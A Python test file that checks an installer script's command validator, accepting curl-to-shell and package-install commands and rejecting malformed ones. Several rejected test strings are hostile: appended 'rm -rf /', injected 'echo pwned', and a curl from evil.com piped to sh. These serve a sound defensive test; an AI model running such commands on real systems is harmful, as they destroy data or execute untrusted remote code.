"""Unit tests for installer.sh validate_command().

Tests the bash function by shelling out via subprocess — the function is
designed to be testable via ``source`` + direct invocation (see the
``BASH_SOURCE`` guard at the bottom of installer.sh).
"""

from __future__ import annotations

import subprocess
import sys
from pathlib import Path

import yaml

SCRIPTS = Path(__file__).resolve().parent.parent / "scripts"
INSTALLER = SCRIPTS / "installer.sh"

SOURCE_CMD = f"source {INSTALLER} && validate_command"


def _validate(cmd: str) -> bool:
    """Run validate_command() in a subprocess and return whether it passed."""
    result = subprocess.run(
        ["bash", "-c", f"{SOURCE_CMD} {cmd!r}"],
        capture_output=True,
        text=True,
    )
    return result.returncode == 0


# ── Valid patterns (should return 0) ──────────────────────────────────


class TestCurlPipeSh:
    def test_https_pipe_sh(self) -> None:
        assert _validate("curl -fsSL https://example.com/install.sh | sh")

    def test_https_pipe_bash(self) -> None:
        assert _validate("curl -fsSL https://example.com/install.sh | bash")

    def test_shuffled_flags(self) -> None:
        assert _validate("curl -fLsS https://example.com/install.sh | bash")

    def test_github_raw_https_pipe_sh(self) -> None:
        # Mirrors the "fresh" install command — GitHub raw URL piped to sh
        assert _validate(
            "curl -fsSL https://raw.githubusercontent.com/sinelaw/fresh"
            "/refs/heads/master/scripts/install.sh | sh"
        )

    def test_https_pipe_sh_with_trailing_fragment(self) -> None:
        # Mirrors the "ollama" install command
        assert _validate("curl -fsSL https://ollama.com/install.sh | sh")


class TestCurlDownloadRun:
    def test_download_run_cleanup(self) -> None:
        assert _validate(
            "curl -fsSL https://example.com/install.sh -o /tmp/install.sh"
            " && bash /tmp/install.sh && rm -f /tmp/install.sh"
        )

    def test_download_run_no_cleanup(self) -> None:
        assert _validate(
            "curl -fsSL https://example.com/install.sh -o /tmp/install.sh"
            " && bash /tmp/install.sh"
        )

    def test_minimal_flags(self) -> None:
        assert _validate(
            "curl -fL https://example.com/install.sh -o /tmp/install.sh"
            " && bash /tmp/install.sh && rm -f /tmp/install.sh"
        )


class TestUvToolInstall:
    def test_unversioned(self) -> None:
        assert _validate("uv tool install pytest")

    def test_versioned(self) -> None:
        assert _validate("uv tool install pytest==9.1.1")

    def test_ruff_versioned(self) -> None:
        assert _validate("uv tool install ruff==0.15.21")

    def test_mypy_versioned(self) -> None:
        assert _validate("uv tool install mypy==2.3.0")


class TestNpmInstall:
    def test_package(self) -> None:
        assert _validate("npm install cline")

    def test_package_version(self) -> None:
        assert _validate("npm install cline@3.0.39")

    def test_global_flag(self) -> None:
        assert _validate("npm install -g cline")

    def test_global_long_flag(self) -> None:
        assert _validate("npm install --global cline")

    def test_global_version(self) -> None:
        assert _validate("npm install -g cline@3.0.39")


class TestPipInstall:
    def test_unversioned(self) -> None:
        assert _validate("pip install requests")

    def test_versioned(self) -> None:
        assert _validate("pip install requests==2.32.0")


# ── Invalid / malicious patterns (should return 1) ────────────────────


class TestForbiddenMetacharacters:
    def test_semicolons(self) -> None:
        assert not _validate("rm -rf / && echo hacked")

    def test_leading_command_with_andand(self) -> None:
        assert not _validate(
            'echo "evil" && curl -fsSL https://evil.com/install.sh | sh'
        )

    def test_semicolon_after_curl(self) -> None:
        assert not _validate("curl -fsSL https://evil.com/install.sh; rm -rf /")


class TestNonHttpsCurl:
    def test_http_curl(self) -> None:
        assert not _validate("curl -fsSL http://example.com/install.sh | sh")


class TestMalformedCurl:
    def test_pipe_with_extra_args(self) -> None:
        assert not _validate(
            "curl -fsSL https://example.com/install.sh | bash -s -- -y"
        )

    def test_download_with_trailing_command(self) -> None:
        assert not _validate(
            "curl -fsSL https://example.com/install.sh -o /tmp/x.sh"
            " && bash /tmp/x.sh && rm -f /tmp/x.sh && echo done"
        )

    def test_bare_curl_no_action(self) -> None:
        assert not _validate(
            "curl -fsSL https://example.com/install.sh"
        )

    def test_curl_without_flags_rejected(self) -> None:
        # curl without any flags (e.g. "fresh" install before the fix)
        # must be rejected — the safe pattern requires -[flags]
        assert not _validate(
            "curl https://raw.githubusercontent.com/sinelaw/fresh"
            "/refs/heads/master/scripts/install.sh | sh"
        )


class TestMalformedUv:
    def test_no_package(self) -> None:
        assert not _validate("uv tool install")

    def test_injected_command(self) -> None:
        assert not _validate("uv tool install pytest; rm -rf /")


class TestMalformedNpm:
    def test_no_package(self) -> None:
        assert not _validate("npm install")

    def test_appended_command(self) -> None:
        assert not _validate("npm install cline && rm -rf /")


class TestMalformedPip:
    def test_no_package(self) -> None:
        assert not _validate("pip install")

    def test_injected_command(self) -> None:
        assert not _validate("pip install requests; echo pwned")

    def test_appended_command(self) -> None:
        assert not _validate("pip install requests && rm -rf /")


class TestConfigExampleCommands:
    """Regression test: every install command in config.example.yml
    must pass validate_command().

    This catches config drift early — e.g. the 'fresh' command previously
    used bare 'curl' (no -fsSL flags) which failed validation at Docker
    build time.
    """


    ROOT = Path(__file__).resolve().parent.parent
    CONFIG = ROOT / "config.example.yml"

    def test_all_config_commands_pass_validation(self) -> None:
        assert self.CONFIG.exists(), f"{self.CONFIG} not found"
        data = yaml.safe_load(self.CONFIG.read_text())
        install = data.get("install", {})
        assert install, "no install entries in config.example.yml"

        failures: list[str] = []
        for key, cmd in install.items():
            if not _validate(cmd):
                failures.append(f"  {key}: {cmd}")

        assert not failures, (
            "The following config commands failed validation:\n"
            + "\n".join(failures)
        )
